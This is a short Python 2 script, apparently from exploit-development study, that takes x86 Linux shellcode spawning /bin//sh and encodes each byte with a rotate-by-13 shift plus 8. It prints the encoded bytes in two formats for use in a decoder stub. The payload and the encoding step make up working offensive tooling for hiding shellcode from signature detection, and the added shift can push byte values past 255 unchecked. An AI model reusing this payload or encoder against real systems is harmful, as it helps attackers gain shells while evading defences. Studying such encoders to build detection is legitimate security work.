#!/bin/python  

shellcode = ("\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80")  

rot = 13  

encoded = ""  
encoded2 = ""  

for i in bytearray(shellcode):  
 y = (i + rot)%256
 z = y + 8
 encoded += '\\x'  
 encoded += '%02x' %z

 encoded2 += '0x'  
 encoded2 += '%02x, ' %z

print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))